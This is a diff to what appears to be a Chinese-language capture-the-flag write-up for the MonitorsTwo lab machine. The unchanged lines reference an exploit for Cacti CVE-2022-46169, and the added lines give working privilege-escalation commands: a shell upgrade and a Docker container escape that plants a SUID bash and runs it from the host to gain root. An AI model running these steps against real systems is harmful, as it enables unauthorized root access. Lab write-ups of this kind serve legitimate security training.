@@ -74,6 +74,7 @@ Papers: No Results
 
 {% embed url="https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22/blob/main/CVE-2022-46169.py" %}
 
+{% code title="CVE-2022-46169.py" fullWidth="false" %}
 ```
 import requests, optparse, sys
 import urllib
@@ -136,6 +137,7 @@ if __name__ == '__main__':
         sys.exit(1)
 
 ```
+{% endcode %}
 
 用该脚本利用漏洞
 
@@ -188,6 +190,12 @@ bash-5.1$ capsh --gid=0 --uid=0 --
 capsh --gid=0 --uid=0 --
 id
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
+```
+
+获取pyt
+
+```
+script -c /bin/bash /dev/null
 ```
 
 正如我们所看到的，我们已经连接到了 Docker 容器，而不是主机。
@@ -377,5 +385,41 @@ Administrator
 CISO
 Monitor Two
 Security Team
+```
+
+我们必须首先使用 findmnt 命令找到容器的路径。
+
+<pre><code>marcus@monitorstwo:/tmp$ findmnt
+
+<strong>├─/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+</strong></code></pre>
+
+cd到这个目录当中
+
+```
+marcus@monitorstwo:~$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
+```
+
+在容器中，作为 root，我们必须将 bash 赋予 SUID 权限。
+
+```
+root@50bca5e748b0:/var/www/html# chmod u+s /bin/bash
+chmod u+s /bin/bash
+root@50bca5e748b0:/var/www/html# ls -l /bin/bash
+ls -l /bin/bash
+-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+```
+
+在主机上，我们从容器运行 bash 以成为 root。
+
+```
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ /bin/bash -p                          
+bash-5.1# whoami
+root
+bash-5.1# id
+uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
+bash-5.1# 
 ```
 
